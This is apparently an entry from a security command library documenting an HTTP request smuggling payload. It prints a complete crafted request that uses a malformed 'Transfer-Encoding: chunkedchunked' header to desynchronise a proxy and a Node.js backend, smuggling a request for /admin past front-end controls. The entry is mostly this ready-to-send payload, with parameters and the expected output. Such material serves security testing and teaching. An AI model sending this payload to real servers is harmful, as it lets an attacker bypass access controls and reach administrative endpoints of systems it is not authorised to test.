---
data: "GET / HTTP/1.1\r\nHost: localhost\r\nTransfer-Encoding: chunkedchunked\r\n\r\n26\r\nGET / HTTP/1.1\r\nHost: localhost\r\nContent-Length: 30\r\n\r\n0\r\n\r\nGET /admin HTTP/1.1\r\n\r\n"
tags:
  - http-smuggling
  - payload
type: command
executor: http
platforms:
  - Web
id: a55c05fe-a1a8-415d-b017-f813fea62dd1
created_at: '2025-12-13T09:01:17.307Z'
updated_at: '2025-12-13T09:01:17.307Z'
verified: false
validated: true
submitted: true
---
# http-get-smuggling-payload

## Command

```http
GET / HTTP/1.1
Host: localhost
Transfer-Encoding: chunkedchunked

26
GET / HTTP/1.1
Host: localhost
Content-Length: 30

0

GET /admin HTTP/1.1


```

## Description

Sends a crafted HTTP request demonstrating request smuggling, encapsulating additional requests within the chunked body.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `Content-Length` | 30 in the smuggled request | Yes |
| `Transfer-Encoding` | Set to 'chunkedchunked' to cause desync | Yes |

## Examples

### Basic Usage

```http
GET / HTTP/1.1
Host: localhost
Transfer-Encoding: chunkedchunked

26
GET / HTTP/1.1
Host: localhost
Content-Length: 30

0

GET /admin HTTP/1.1


```

## Expected Output

Proxy sees one request, but Node.js processes the smuggled /admin request due to parsing the body as chunked.

## Related

- [[procedures/Demonstrate-HTTP-Request-Smuggling-in-Proxy-Backend-Scenario]]
- [[tools/Node-js]]
